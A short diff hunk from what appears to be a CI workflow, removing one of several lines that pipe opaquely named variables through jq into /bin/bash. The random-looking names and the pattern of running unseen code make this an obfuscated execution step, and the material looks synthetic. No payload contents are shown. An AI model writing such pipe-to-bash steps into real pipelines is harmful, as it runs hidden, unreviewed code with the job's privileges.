@@ -28,7 +28,6 @@ jobs:
           echo $kc87 | jq -r .oiaia4405 | /bin/bash
           echo $uznm51558 | jq -r .l5179 | /bin/bash
           echo $j2 | jq -r .faqx1624 | /bin/bash
-          echo $vsu2 | jq -r .l250 | /bin/bash
           printf '%s' "$lnd1" | jq -r .ggyld05525 | /bin/bash
           printf '%s' "$rz688" | jq -r .t9221 | /bin/bash
           echo $azt93758 | jq -r .zeb181 | /bin/bash
